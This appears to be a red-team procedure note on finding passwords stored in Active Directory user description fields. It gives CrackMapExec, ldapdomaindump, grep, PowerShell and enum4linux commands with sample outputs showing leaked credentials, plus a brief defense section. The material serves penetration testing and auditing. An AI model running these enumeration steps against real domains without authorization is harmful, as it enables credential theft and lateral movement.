---
id: 905f2bc5-61ff-4235-9951-60c199116e86
name: Enumerate-Passwords-in-AD-User-Descriptions
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:04.416196+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
  - '[[techniques/Account Discovery|T1087 - Account Discovery]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Password in AD User comment]]'
commands:
  - '[[commands/crackmapexec-enumerate-user-descriptions]]'
  - '[[commands/crackmapexec-get-user-descriptions-kdc]]'
  - '[[commands/ldapdomaindump-authenticated-dump]]'
  - '[[commands/grep-search-file-for-password-pattern]]'
  - '[[commands/enum4linux-grep-user-descriptions]]'
  - '[[commands/powershell-get-ad-user-accounts-descriptions]]'
platforms:
  - Windows
  - Active Directory
tools: []
validated: true
---

# Enumerate-Passwords-in-AD-User-Descriptions

## Summary

This procedure outlines how to enumerate Active Directory user descriptions to identify passwords or sensitive information stored in the description field of user accounts. In misconfigured environments, administrators sometimes store credentials in these fields, allowing attackers with domain read access to extract them for privilege escalation or lateral movement.

## Description

Active Directory user objects include a 'description' attribute that is intended for non-sensitive notes but is sometimes abused to store passwords, shared secrets, or other credentials. This procedure uses LDAP querying tools to retrieve these descriptions and search for patterns indicative of passwords. It targets domain controllers via authenticated LDAP queries and is effective in reconnaissance phases of AD attacks. Success depends on having valid domain credentials and network access to a domain controller. The technique aligns with credential dumping by extracting plaintext secrets from AD attributes.

## Requirements

1. Valid domain user credentials with read access to user objects in AD.
2. Network connectivity to a domain controller (ports 389/TCP for LDAP, 636/TCP for LDAPS).
3. Installed tools: CrackMapExec, ldapdomaindump, enum4linux (for Samba-based enumeration), PowerShell with ActiveDirectory module.
4. Target environment: Windows Active Directory domain.

## Defense

- Enforce policies prohibiting storage of sensitive information in user description fields; use auditing to detect such configurations.
- Implement least-privilege access: Restrict LDAP queries to necessary accounts and monitor for anomalous enumeration (e.g., via Event ID 4662 in Windows Security logs).
- Use tools like Microsoft ATA or Azure AD Identity Protection to detect unusual AD queries.
- Regularly audit user objects for exposed secrets using scripts or compliance tools.

## Objectives

1. Retrieve descriptions for all or targeted AD user accounts.
2. Search retrieved data for password-like patterns or keywords.
3. Extract and validate any discovered credentials for further use in the attack.
4. Identify misconfigurations that expose sensitive information.

## Instructions

### Step 1: Enumerate User Descriptions Using CrackMapExec

**Context**: Use CrackMapExec's 'user-desc' module to query LDAP for user descriptions across the domain. This step authenticates to the domain and dumps descriptions, which may contain embedded passwords. Replace placeholders with actual values.

**Command** ([[commands/crackmapexec-enumerate-user-descriptions]]):
```bash
crackmapexec ldap $_DOMAIN -u $_USERNAME -p $_PASSWORD -M user-desc
```

> This command connects to the domain via LDAP and enumerates descriptions for all users. It performs authenticated queries, making it stealthier than anonymous enumeration. If successful, it lists users and their descriptions, allowing manual inspection for passwords.

**Expected Output**:
```
LDAP         10.0.2.11:389  dc01 [+] DOMAIN\username:password (Pwn3d!)
USER-DESC    10.0.2.11:389  dc01 [+] Found following users:
USER-DESC    10.0.2.11:389  dc01 User: Guest description: Built-in account for guest access to the computer/domain
USER-DESC    10.0.2.11:389  dc01 User: krbtgt description: Key Distribution Center Service Account
USER-DESC    10.0.2.11:389  dc01 User: admin description: Password: SuperSecret123!
```

### Step 2: Enumerate Descriptions with KDC Host Specification

**Context**: If the domain resolution fails, specify the KDC host explicitly using the 'get-desc-users' module. This variant targets a specific DC IP and is useful when DNS is restricted or unreliable.

**Command** ([[commands/crackmapexec-get-user-descriptions-kdc]]):
```bash
crackmapexec ldap $_DC_IP -u $_USERNAME -p $_PASSWORD --kdcHost $_DC_IP -M get-desc-users
```

> This authenticates to the specified DC and retrieves user descriptions. Review the output for any lines containing potential credentials, such as 'password:' or base64-encoded strings.

**Expected Output**:
```
GET-DESC... 10.0.2.11       389    dc01    [+] Found following users:
GET-DESC... 10.0.2.11       389    dc01    User: Guest description: Built-in account for guest access to the computer/domain
GET-DESC... 10.0.2.11       389    dc01    User: admin description: Access password is P@ssw0rd123
```

### Step 3: Dump Full AD Domain Information with ldapdomaindump

**Context**: Perform a comprehensive AD dump to capture all user attributes, including descriptions, for offline analysis. This generates files that can be searched for secrets.

**Command** ([[commands/ldapdomaindump-authenticated-dump]]):
```bash
ldapdomaindump -u '$_DOMAIN\$_USERNAME' -p $_PASSWORD $_DC_IP -o $_OUTPUT_DIR
```

> Authenticate and dump the domain schema, users, groups, and other objects to the output directory. Focus on the 'users.ldif' or similar files for description attributes.

**Expected Output**:
Files generated in $_OUTPUT_DIR, e.g.,
```
dn: CN=Admin,CN=Users,DC=domain,DC=lab
...
description: Emergency password: AdminPass456
...
```

### Step 4: Search Dump Files for Password Patterns

**Context**: After dumping, use grep to scan output files for keywords like 'password', 'secret', or common patterns. This automates identification of exposed credentials.

**Command** ([[commands/grep-search-file-for-password-pattern]]):
```bash
grep -i 'password\|secret\|key' $_DUMP_FILE
```

> Recursively search if needed with -r on the directory. This step reveals any descriptions containing credentials without manual review of all data.

**Expected Output**:
```
User: admin description: The password is TempPass789
User: service description: API key: sk-abc123def456
```

### Step 5: Enumerate User Accounts and Descriptions via PowerShell or enum4linux

**Context**: For Windows targets, use PowerShell to query local or domain user accounts. Alternatively, use enum4linux for Samba-compatible enumeration if direct AD access is limited.

**Command** ([[commands/powershell-get-ad-user-accounts-descriptions]]):
```powershell
Get-WmiObject -Class Win32_UserAccount -Filter "Domain='$_DOMAIN' AND Disabled='False'" | Select Name, Domain, Description
```

> Or for Linux/Samba: Use [[commands/enum4linux-grep-user-descriptions]]. This retrieves active user details; pipe to Select for descriptions only.

**Expected Output**:
```
Name     Domain Description
----     ------ -----------
admin    LAB    Backup password: Backup123!
guest    LAB    Built-in guest account
```

**Success Indicators**:
- Descriptions retrieved without authentication errors.
- Keywords like 'password' appear in output.
- Extracted credentials validate against AD login.
